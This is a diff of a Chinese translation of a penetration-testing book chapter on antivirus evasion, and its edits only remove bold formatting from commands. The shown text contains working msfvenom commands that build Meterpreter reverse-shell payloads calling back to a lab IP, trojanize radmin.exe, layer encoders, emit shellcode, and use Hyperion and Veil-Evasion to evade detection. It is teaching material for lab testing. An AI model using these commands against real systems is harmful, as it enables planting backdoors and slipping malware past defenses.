@@ -15,7 +15,7 @@
 示例 12-1. Msfvenom 帮助页面
 
 ```
-root@kali:~# **msfvenom -h**
+root@kali:~# msfvenom -h
 Usage: /opt/metasploit/apps/pro/msf3/msfvenom [options] <var=val>
 
 Options:
@@ -36,7 +36,7 @@ Options:
 要将有效负载嵌入到 *radmin.exe* 二进制文件中，输入：
 
 ```
-root@kali:~# **msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=2345 -x /usr/share/windows-binaries/radmin.exe -k -f exe > radmin.exe**
+root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=2345 -x /usr/share/windows-binaries/radmin.exe -k -f exe > radmin.exe
 ```
 
 我们的 Msfvenom 命令使用 `-p` 选项指定生成的有效负载。我们将 `LHOST` 选项设置为 Kali 的 IP 地址，这是有效负载运行时回调的系统。我们还可以设置 `LPORT` 选项。如本节所讨论，`-x` 选项选择一个可执行文件作为有效负载的嵌入目标。`-k` 选项将在独立线程中运行有效负载。`-f` 标志告诉 Msfvenom 将有效负载构建为可执行格式。一旦创建完成，在 Windows XP 或 Windows 7 目标上运行这个被植入木马的二进制文件。Radmin Viewer 程序应该看起来正常运行（图 12-1），但嵌入的有效负载应该为我们提供一个 Meterpreter 会话，前提是我们使用 *multi/handler* 模块设置了处理程序。
@@ -48,10 +48,10 @@ root@kali:~# **msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LP
 让我们比较原始的 *radmin.exe* 与我们被植入木马的版本的 MD5 哈希值。在 Kali Linux 中，`md5sum` 程序将计算文件的 MD5 哈希值。对两个二进制文件运行 `md5sum`，你会发现它们的哈希值有显著差异，如 ❶ 和 ❷ 所示。
 
 ```
-root@kali:~# **md5sum /usr/share/windows-binaries/radmin.exe**
+root@kali:~# md5sum /usr/share/windows-binaries/radmin.exe
 ❶2d219cc28a406dbfa86c3301e8b93146  /usr/share/windows-binaries/radmin.exe
 
-root@kali:~# **md5sum radmin.exe**
+root@kali:~# md5sum radmin.exe
 ❷4c2711cc06b6fcd300037e3cbdb3293b  radmin.exe
 ```
 
@@ -60,10 +60,10 @@ root@kali:~# **md5sum radmin.exe**
 当然，检查两个独立的哈希值比检查一个要好。SHA 家族包含多种哈希算法，所使用的版本会因厂商而异。Kali 自带多种 SHA 哈希计算工具。例如，`sha512sum`计算 64 位块大小的 SHA-2 哈希，如下所示。
 
 ```
-root@kali:~# **sha512sum /usr/share/windows-binaries/radmin.exe**
+root@kali:~# sha512sum /usr/share/windows-binaries/radmin.exe
 5a5c6d0c67877310d40d5210ea8d515a43156e0b3e871b16faec192170acf29c9cd4e495d2e03b8d
 7ef10541b22ccecd195446c55582f735374fb8df16c94343  /usr/share/windows-binaries/radmin.exe
-root@kali:~# **sha512sum radmin.exe**
+root@kali:~# sha512sum radmin.exe
 f9fe3d1ae405cc07cd91c461a1c03155a0cdfeb1d4c0190be1fb350d43b4039906f8abf4db592b060
 d5cd15b143c146e834c491e477718bbd6fb9c2e96567e88  radmin.exe
 ```
@@ -119,7 +119,7 @@ VirusTotal 与防病毒厂商共享上传的二进制文件，以便他们编写
 示例 12-2：Msfvenom 编码器
 
 ```
-root@kali:~# **msfvenom -l encoders**
+root@kali:~# msfvenom -l encoders
 Framework Encoders
 ==================
 
@@ -139,7 +139,7 @@ Framework Encoders
 示例 12-3：使用 Msfvenom 创建编码的可执行文件
 
 ```
-root@kali:~# **msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=2345 -e x86/shikata_ga_nai -i 10 -f exe > meterpreterencoded.exe**
+root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=2345 -e x86/shikata_ga_nai -i 10 -f exe > meterpreterencoded.exe
 [*] x86/shikata_ga_nai succeeded with size 317 (iteration=1)
 [*] x86/shikata_ga_nai succeeded with size 344 (iteration=2)
 --*snip*--
@@ -156,11 +156,11 @@ root@kali:~# **msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LP
 示例 12-4. 使用 Msfvenom 进行多重编码
 
 ```
-root@kali:~# **msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=2345 -e x86/shikata_ga_nai -i 10 -f raw**❶ **> meterpreterencoded.bin**❷
+root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=2345 -e x86/shikata_ga_nai -i 10 -f raw❶ **> meterpreterencoded.bin**❷
 [*] x86/shikata_ga_nai succeeded with size 317 (iteration=1)
 --*snip*--
 [*] x86/shikata_ga_nai succeeded with size 560 (iteration=10)
-root@kali:~# **msfvenom -p -**❸ **-f exe -a x86**❹ **--platform windows**❺ **-e x86/bloxor -i 2 > meterpretermultiencoded.exe < meterpreterencoded.bin**❻
+root@kali:~# msfvenom -p -❸ **-f exe -a x86**❹ **--platform windows**❺ **-e x86/bloxor -i 2 > meterpretermultiencoded.exe < meterpreterencoded.bin**❻
 [*] x86/bloxor succeeded with size 638 (iteration=1)
 [*] x86/bloxor succeeded with size 712 (iteration=2)
 ```
@@ -172,7 +172,7 @@ root@kali:~# **msfvenom -p -**❸ **-f exe -a x86**❹ **--platform windows**❺
 生成的可执行文件在 VirusTotal 上的 33 个杀毒程序中被检测到——比单独使用*shikata_ga_nai*稍微好一些。你可能可以通过尝试不同的编码器组合，或将多个编码器连接在一起，或者通过结合不同技术来改善你的结果。例如，如果我们将有效载荷嵌入二进制文件并像这里展示的那样用*shikata_ga_nai*进行编码，结果会怎么样呢？
 
 ```
-root@kali:~# **msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=2345 -x /usr/share/windows-binaries/radmin.exe -k -e x86/shikata_ga_nai -i 10 -f exe > radminencoded.exe**
+root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=2345 -x /usr/share/windows-binaries/radmin.exe -k -e x86/shikata_ga_nai -i 10 -f exe > radminencoded.exe
 ```
 
 这只带来了轻微的改进：有效载荷被 21 个杀毒程序检测到。不幸的是，Microsoft Security Essentials 将这两个可执行文件都标记为恶意，如图 12-7 所示。如果我们要绕过杀毒软件检测，我们需要超越 Metasploit 编码器，去看更多的解决方案，尤其是针对 Windows 7 目标。
@@ -206,7 +206,7 @@ int main(void) ❸
 示例 12-6. 创建 C 格式的原始有效负载
 
 ```
-root@kali:~# **msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=2345 -f c -e x86/shikata_ga_nai -i 5**
+root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=2345 -f c -e x86/shikata_ga_nai -i 5
 unsigned char buf[] =
 "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
 "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
@@ -220,7 +220,7 @@ unsigned char buf[] =
 但是，如果我们仅仅使用`cat`命令输出*/dev/urandom*的数据，我们会得到大量不可打印的字符。为了获得适合字符数组的数据，我们将使用 Linux 的`tr`工具将*/dev/urandom*的数据转换为可打印字符。使用`tr -dc A-Z-a-z-0-9`，然后将命令传递给`head`命令，以仅输出来自*/dev/urandom*的前 512 个字符，如下所示。
 
 ```
-root@kali:~# **cat /dev/urandom | tr -dc A-Z-a-z-0-9 | head -c512**
+root@kali:~# cat /dev/urandom | tr -dc A-Z-a-z-0-9 | head -c512
 s0UULfhmiQGCUMqUd4e51CZKrvsyIcLy3EyVhfIVSecs8xV-JwHYlDgfiCD1UEmZZ2Eb6G0no4qjUIIsSgneqT23nCfbh3keRfuHEBPWlow5zX0fg3TKASYE4adL
 --*snip*--
 ```
@@ -265,7 +265,7 @@ int main(void)
 现在我们需要编译 C 程序。我们不能使用内置的 GCC 程序，因为它会将程序编译成适用于 Linux 系统的格式，而我们需要在 32 位 Windows 系统上运行。相反，我们将使用 Kali Linux 仓库中的 Mingw32 交叉编译器，这是我们在第一章中安装的。如果你还没有安装，使用**`apt-get install mingw32`**进行安装，然后使用**`i586-mingw32msvc-gcc`**编译自定义 C 文件。（除了程序名称，使用交叉编译器的语法与 Linux 内置的 GCC 相同，后者在第三章中讨论过。）
 
 ```
-root@kali:~# **i586-mingw32msvc-gcc -o custommeterpreter.exe custommeterpreter.c**
+root@kali:~# i586-mingw32msvc-gcc -o custommeterpreter.exe custommeterpreter.c
 ```
 
 现在将生成的可执行文件上传到 VirusTotal。截至目前，18 款防病毒产品已检测到该恶意文件。这是一个进步，但 Microsoft Security Essentials 仍然能够捕捉到我们的文件。
@@ -285,9 +285,9 @@ root@kali:~# **i586-mingw32msvc-gcc -o custommeterpreter.exe custommeterpreter.c
 示例 12-8。运行 Hyperion
 
 ```
-root@kali:~# **msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=2345 -f exe > meterpreter.exe**
-root@kali:~# **cd Hyperion-1.0/**
-root@kali:~/Hyperion-1.0# **wine ../hyperion ../meterpreter.exe bypassavhyperion.exe**❶
+root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=2345 -f exe > meterpreter.exe
+root@kali:~# cd Hyperion-1.0/
+root@kali:~/Hyperion-1.0# wine ../hyperion ../meterpreter.exe bypassavhyperion.exe❶
 
 Opening ../bypassav.exe
 Copied file to memory: 0x117178
@@ -336,7 +336,7 @@ Veil-Evasion 中实现的方法之一使用了前面描述的 Python 注入技�
 示例 12-9. 运行 Veil
 
 ```
-root@kali:~/Veil-Evasion-master# **./Veil-Evasion.py**
+root@kali:~/Veil-Evasion-master# ./Veil-Evasion.py
 ========================================================================
  Veil-Evasion | [Version]: 2.6.0
 ========================================================================
